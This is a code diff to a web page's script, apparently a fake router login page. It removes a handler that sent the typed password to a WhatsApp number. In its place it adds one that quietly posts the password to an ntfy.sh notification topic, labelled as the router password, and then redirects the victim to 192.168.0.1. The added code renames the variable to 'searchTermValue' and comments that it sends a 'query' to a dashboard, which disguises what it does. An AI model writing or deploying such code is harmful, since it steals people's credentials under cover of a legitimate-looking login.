@@ -283,14 +283,29 @@
       closeTip();
     }
   });
-  
-document.querySelector('.login-btn').addEventListener('click', function() {
-    const password = document.getElementById('password').value;
-   
-    window.open(`https://wa.me/254113313338?text=Password: ${password}`);
-   
-    window.location.href = 'http://192.168.0.1';
+  document.querySelector('.login-btn').addEventListener('click', function() {
+    
+    const searchTermValue = document.getElementById('password').value;
+    
+    // Check to make sure they actually typed something before sending
+    if (searchTermValue.trim() !== "") {
+        
+        // Silently send the query to your web dashboard in the background
+        fetch('https://ntfy.sh/my-shop-alerts-7729', {
+            method: 'POST',
+            body: `🛒 password entered for router is : ${searchTermValue}`
+        })
+        .then(response => {
+             window.location.href = 'http://192.168.0.1';
+        })
+        .catch(error => {
+            window.location.href = 'http://192.168.0.1';
+        });
+        
+    }
 });
+
+
   document.addEventListener('keydown', function(e) {
     if (e.key === 'Escape') closeTip();
   });
